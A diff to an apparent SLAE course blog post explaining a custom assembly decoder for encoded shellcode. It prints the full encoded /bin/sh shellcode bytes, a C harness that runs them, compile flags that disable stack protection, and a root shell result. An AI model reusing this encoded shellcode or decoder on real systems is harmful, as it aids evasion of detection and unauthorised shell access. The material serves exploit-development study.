@@ -284,6 +284,103 @@ call_decoder:
 	shellcode: db 0xff,0x62,0x0f,0xc0,0xde,0xff,0xa0,0x5a,0xff,0xd0,0x1b,0xff,0x5e,0x09,0xff,0x5e,0xed,0xff,0xe6,0x09,0xff,0xd0,0x93,0xff,0xd0,0x30,0xff,0x5e,0xc8,0xff,0xc4,0x26,0xff,0xd2,0x3e,0xff,0xdc,0xa3,0x89,0x14,0xe3,0x9a,0xff,0xa0,0x47,0x89,0xe0,0xe2,0xa2,0xff,0xa6,0xa5,0x89,0x8b,0xe1,0x9e,0xb0,0x67,0xff,0x16,0x8c,0xcd,0xb2,0x80,0x30,0xaa
 ```
 
+Let's break this down:
++ the first thing we do with `jmp short call_decoder` is direct control flow to our `call_decoder` function. This function's first instruction is `call decoder`, what this does is store the `shellcode: db` content on the top of the stack and then direct control flow to the `decoder` function. 
+
+```nasm
+decoder:
+	pop esi
+	lea edi, [esi]
+	xor eax, eax
+	xor ebx, ebx
+```
+
+All we're doing is popping the `shellcode: db` off of the top of the stack and into `esi` so `esi` has our shell-code now. We are going to use `edi` to keep track of our decoded shell-code so we `lea` it with the memory location of `esi`. Then we just clear registers.
+
+Let's observe that our first byte in our payload is `0xff` which we know from our encoder means that the byte after it has been switched one place to the right. Let's examine the `sniffer` function to see how it handles this. 
+
+```nasm
+sniffer:
+	mov bl, byte [esi + eax]	; $eax is 0, so this is just moving the byte at $esi (0xff) into $bl
+	cmp bl, 0xaa			; compare $bl with 0xaa, if it's a zero, we're done decoding, send control flow our shell-code
+	jz shellcode
+	mov bl, byte [esi + eax]	; again, just loading $bl up with the byte at $esi since $eax is zero.
+	cmp bl, 0xff			; here, we actually will get a zero because bl is 0xff right now
+	jz shifter			; jump on zero to the function shifter
+```
+
+Let's see what shifter does. 
+
+```nasm
+shifter:
+	mov bl, byte [esi + eax + 1]	; we know the byte after 0xff is the one we want, load it into $bl
+	shr bl, 1			; we 'shift it right' once, to retrieve its original value
+	mov byte [edi], bl		; then we store that value into $edi
+	inc edi				; $edi at its original position is full of that value, so lets move to $edi's second position
+	add al, 3			; since $esi is on the 0xff, we need to add 3 to $al so we skip 0xff, shifted byte, junk byte
+	jmp short sniffer		; start sniffer over
+```
+
+To break down the `add al, 3` portion further, we had this structure `0xff,0x62,0x0f,0xc0` at the beginning of our shell-code so once we interrogated the `$esi` + `$eax` position, which was `0xff`, we can now rule out `0x62` and `0x0f` for interrogation because we restored `0x62` to its original value, and we know `0x0f` was a garbage insertion. So now we add 3 to `$eax` so that next time we interrogate the `$esi` + `$eax (3)` we'll be interrogating `0xc0` which is what we want because we have to check if this new unknown byte is `0xaa` or `0xff` and if it's neither, we know it's a good byte to add to `$edi` who is tracking our decoded payload. 
+
+Let's see what happens in the rest of the `sniffer` function when we get to a good byte like `0xc0`. 
+
+```nasm
+mov bl, byte [esi + eax]	; since we know its a good byte, move it into $bl
+	mov byte [edi], bl	; move it into $edi who's keeping track of our decoded shell-code
+	inc edi			; this $edi position has been filled with a good byte, let's move to the next empty one
+	add al, 2		; we know the byte after this will be garbage, so we lets skip it
+	jmp short sniffer	; start this loop over
+```
+
+Let's test it!
+
+```terminal_session
+root@kali:~# objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x2e\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\xaa\x74\x24\x8a\x1c\x06\x80\xfb\xff\x74\x0a\x8a\x1c\x06\x88\x1f\x47\x04\x02\xeb\xe6\x8a\x5c\x06\x01\xd0\xeb\x88\x1f\x47\x04\x03\xeb\xd9\xe8\xcd\xff\xff\xff\xff\x62\x0f\xc0\xde\xff\xa0\x5a\xff\xd0\x1b\xff\x5e\x09\xff\x5e\xed\xff\xe6\x09\xff\xd0\x93\xff\xd0\x30\xff\x5e\xc8\xff\xc4\x26\xff\xd2\x3e\xff\xdc\xa3\x89\x14\xe3\x9a\xff\xa0\x47\x89\xe0\xe2\xa2\xff\xa6\xa5\x89\x8b\xe1\x9e\xb0\x67\xff\x16\x8c\xcd\xb2\x80\x30\xaa"
+```
+
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x2e\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\xaa\x74\x24\x8a\x1c\x06\x80\xfb\xff\x74\x0a\x8a\x1c\x06\x88\x1f\x47\x04\x02\xeb\xe6\x8a\x5c\x06\x01\xd0\xeb\x88\x1f\x47\x04\x03\xeb\xd9\xe8\xcd\xff\xff\xff\xff\x62\x0f\xc0\xde\xff\xa0\x5a\xff\xd0\x1b\xff\x5e\x09\xff\x5e\xed\xff\xe6\x09\xff\xd0\x93\xff\xd0\x30\xff\x5e\xc8\xff\xc4\x26\xff\xd2\x3e\xff\xdc\xa3\x89\x14\xe3\x9a\xff\xa0\x47\x89\xe0\xe2\xa2\xff\xa6\xa5\x89\x8b\xe1\x9e\xb0\x67\xff\x16\x8c\xcd\xb2\x80\x30\xaa"
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+
+Next we compile it.
+
+```terminal_session
+root@kali:~# gcc -fno-stack-protector -z execstack -m32 shellcode.c -o decodeTest
+shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+ main()
+ ^~~~
+```
+
+Moment of truth, we should get back a `/bin/sh` command shell if this works. 
+
+```terminal_session
+root@kali:~# ./decodeTest
+Shellcode Length:  119
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# uname -a
+Linux kali 4.17.0-kali1-686 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) i686 GNU/Linux
+# 
+```
+
+It works!! 14 hours well spent lol. 
 
 ## Github
 
@@ -292,7 +389,7 @@ This blog post has been created for completing the requirements of the SecurityT
 
 Student ID: SLAE-1458
 
-You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment3)
+You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment4)
 
 
 
